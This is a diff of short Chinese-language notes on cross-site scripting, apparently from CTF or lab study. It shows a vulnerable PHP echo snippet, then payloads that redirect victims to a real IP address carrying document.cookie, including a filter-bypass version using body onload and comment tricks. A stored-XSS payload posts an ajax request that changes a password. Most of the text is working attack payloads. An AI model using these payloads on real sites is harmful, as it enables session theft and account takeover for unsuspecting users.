@@ -1,6 +1,5 @@
 反射型：
 
-
 ```php
 $conten=$_GET[1];
 if(isset($content)){
@@ -9,6 +8,7 @@ if(isset($content)){
     echo 'no data input';
 }
 ```
+
 ```javascript
 <script>document.location.href='http://49.232.215.127/1.php?1='+document.cookie</script>
 // 过滤了script
@@ -17,8 +17,6 @@ if(isset($content)){
 <body/**/onload="window.location.href='http://49.232.215.127/1.php?1='+document.cookie"></body>
 
 ```
-
-
 
 存储型
 
@@ -37,6 +35,3 @@ post方法提交
 <script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
 
 ```
-
-
-
